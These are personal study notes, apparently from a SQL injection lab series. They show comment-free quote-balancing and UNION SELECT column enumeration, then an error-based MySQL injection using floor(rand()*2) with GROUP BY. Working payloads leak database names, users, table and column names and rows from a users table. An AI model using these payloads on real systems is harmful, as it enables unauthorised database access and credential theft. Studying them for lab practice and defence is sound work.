# WIP LESSON 5 to

Part 5 from here

This time we're not allowed to use comments,consider there is a system which filters out the comments.

Consider our query looks like this

select id,username,password from table where id='1'.

So consider our input as 1' or '1

so it'll be,
select id,username,password from table where id='1' or '1'

So here '1' or '1' will be evaluated and 1 will be returned which will fetch all the username and password from the database but the website will only display the first row

When we give input as 1' and '1 the first page gets shown and when we give input as 2' and ' the second page gets shown because the AND operator works in sql, here it'll check if 2 is present in the table if it is it'll return true because the right side of AND is true.

lets try to enumerate the number of columns from this using order_by as earlier, but no matter what we give to order_by like order by(50) it wouldn't display any error because order by won't work without any comments(why?)

But we'll workaround this using union select 

we'll give something like 1' union select 1 AND '1, we'll get an error saying that the number of columns are different, we can use this get the number of columns in database.

1' union select 1,2,3 AND '1 -> No error , means there are 3 columns, now we have to break the right query as before so we'll inject something like this 50' union select 1,2,3 AND '1, Now we can enumerate a number of stuff like database names,version,current_user etc

50' union select 1,version(),3 AND '1

Part 6 from here

Unlike the previous levels in here we'll see that changing the id parameter, won't give us any valuable output the only thing we get is the error when mysql crashes so we somehow need to use the mysql error to our advantage.

So if we have a query like this select table_name,table_schema from information_schema.tables group by table_schema, Here we will get a table showing unique entries of table_schema(ie table names,basically what group by does).

From here on we'll be creating a bunch of sub queries.

select database();

select select(database());

select concat((select database()));

select concat(0x3a,0x3a,(select database()),0x3a,0x3a);

Here 0x3a denotes the value of colon(:) in hex.

select concat(0x3a,0x3a,(select database()),0x3a,0x3a) as a;

Adding in some randomness

select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a;

Also we can do something like this

select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.tables; -> This will print the output of our query the same number of times as the total number of rows in the table.

Same stuff

select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.tables; 

Now we'll add a count and a group by statement like this

select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.tables; 

Doing the same for columns we get 

select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns;

While running this a couple of times we'll get an error which actually shows the output of ```select database()``` interesting now we can enumerate all kinds of info like the user()

select count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns;

We can even get the table names as follows 

select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema = database() limit 0,1),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns;

### Having doubts regarding as why it does that?

Now lets apply this stuff to the frontend 

so our complete payload would look this(first try)

' AND (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema = database() limit 0,1),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns) --+  [The entire query needs to enclosed in a curly bracket as it's a parameter for the AND operator]

And we get an error => Operand should contain 1 column(s)

the right side of AND statement is returning a table containing two columns 

we can reduce it to only one column containing a lot of ones to fix this 

' AND (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema = database() limit 0,1),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns)) --+

Now we get a new error => Every derived table must have its own alias

lets do that,


' AND (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema = database() limit 0,1),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a) as b) --+

and we get an error which out puts the first table name we can change the limit to get the names of the remaining tables.[The query didn't work with group by]

And hence we can get all other information just by changing the sub query.

like the current_user

' AND (select 1 from(select count(*),concat(0x3a,0x3a,(select current_user),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a) as b) --+

Now we can get the column name as well

' AND (select 1 from(select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a) as b) --+

Now we have  table and columns value we can now get the data.

' AND (select 1 from(select count(*),concat(0x3a,0x3a,(select id from users limit 0,1),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a) as b) --+

by changing the limit value we can get the whole databases very interesting......